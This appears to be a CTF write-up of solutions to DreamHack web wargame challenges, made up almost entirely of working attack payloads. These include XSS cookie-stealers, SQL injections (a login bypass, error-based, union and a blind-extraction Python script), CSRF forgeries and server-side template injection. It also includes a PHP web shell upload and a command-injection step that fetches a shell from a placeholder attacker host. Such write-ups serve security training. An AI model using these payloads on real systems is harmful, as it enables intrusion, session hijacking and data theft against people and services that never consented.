# Level 1 — DreamHack

The levels in in the most solved to least order

## session-basic

Visit `/admin` and get:

```json
{ "2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d": "admin" }
```

Make a curl request:

```bash
curl http://host8.dreamhack.games:8733 -b "sessionid=2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d"
```

## xss-1

Submit `<script>location.href="/memo?memo="+document.cookie</script>` in `/flag`, then visit `/memo` to get the flag.

## simple_sqli

Login with:

```
Username: admin" --
Password: anything
```

## xss-2

Submit `<img src=x onerror="location.href='/memo?memo='+document.cookie">` in `/flag`, then visit `/memo` to get the flag.

## csrf-1

Submit `<img src="/admin/notice_flag?userid=admin">` to trigger the CSRF vulnerability update the `memo_text`, then visit `/memo` to get the flag.

## csrf-2

Submit `<img src="/change_password?pw=1234">` to trigger change password of the admin, then login with:

```
Username: admin
Password: 1234
```

Then get the flag.

## image-storage

Upload a `shell.php`:

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
```

Then visit `/uploads/shell.php?cmd=cat /flag.txt` to get the flag.

## XSS Filtering Bypass

Submit:

```html
<iframe
  src="javascri	pt:locati\u006F\u006E='/memo?memo='+\u0064ocument.cookie;"
/>
```

This payload will bypass the check and get the flag for us.

## simple-ssti

Visit `/%7B%7B%20config.__class__.__init__.__globals__['os'].popen('cat ./flag.txt').read()%20%7D%7D` to get the flag.

## simple_sqli_chatgpt

Use this payload as userlevel:

```
0' AND userid = 'admin' --
```

This will return the flag.

## proxy-1

In `/socket`, host is `127.0.0.1`, port is `8000`, data:

```
POST /admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Admin Browser
DreamhackUser: admin
Cookie: admin=true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin
```

## php-1

Visit `/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag` you should see a base64 encoded value, decode it to get the flag.

## error based sql injection

Submit the first payload to get the first part of the flag:

```sql
admin' AND extractvalue(1, concat(0x7e, (SELECT upw FROM user WHERE uid='admin'), 0x7e)) AND '1'='1
```

Submit the second payload to get the second part of the flag:

```sql
admin' AND extractvalue(1, concat(0x7e, substring((SELECT upw FROM user WHERE uid='admin'), 20), 0x7e)) AND '1'='1
```

## command-injection-chatgpt

Submit the payload:

```
0.0.0.0; cat ./flag.py
```

## sql injection bypass WAF

Blind SQL Injection can be used in this challenge:

```python
import requests
import string
import urllib.parse


charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
target_url = "http://host3.dreamhack.games:15683/?uid="
received_flag_content = ""

for i in range(4, 44):
    for char in charset:
        res = requests.get(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")
        print(f"Tried {received_flag_content}{char}")
        print(f"{target_url}{urllib.parse.quote_plus(f"'||uid=CHAR(97,100,109,105,110)&&SUBSTRING(upw,{i},1)='{char}")}")

        if "admin" in res.text:
            received_flag_content += char
            print(f'GOT {received_flag_content}')
            print()
            break

print(f"Flag content {received_flag_content}")
```

## CSRF Advanced

This is the updated challenge with CSRF check however we can take the CSRF by this:

```python
from hashlib import md5

print(md5(("admin" + "127.0.0.1").encode()).hexdigest())
```

Submit payload in `/flag`:

```
<img src="/change_password?pw=1234&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
```

Login as `admin:1234` to get the flag.

## baby-union

Submit payload in `uid` to get tables:

```
' UNION SELECT table_name, 2, 3, 4 FROM information_schema.tables #
```

Found `onlyflag` table. Use payload to get list of columns:

```
' UNION SELECT column_name, 2, 3, 4 FROM information_schema.COLUMNS WHERE table_name = 'onlyflag' #
```

Final payload to get the flag:

```
' UNION SELECT sname, svalue, sflag, sclose FROM onlyflag #
```

However because the third column is hidden which is the `sflag` so reposition it to see the `sflag` value (which is the middle part of the flag):

```
' UNION SELECT sname, svalue, sclose, sflag FROM onlyflag #
```

## Command Injection Advanced

Host a public file `pwn.txt`:

```txt
<?php
// Since /flag is 111 (execute only), we must run it, not read it.
system('/flag');
?>
```

Submit payload:

```
http://<ATTACKER_IP>/pwn.txt -o cache/shell.php
```

Then visit to get the flag:

```
http://host8.dreamhack.games:23798/cache/shell.php
```

## [wargame.kr] login filtering

Login as:

```
Username: Guest
Password: guest
```

## [wargame.kr] strcmp

Use Browser Console to change the input:

```html
<input type="text" name="password[]" value="123" />
```
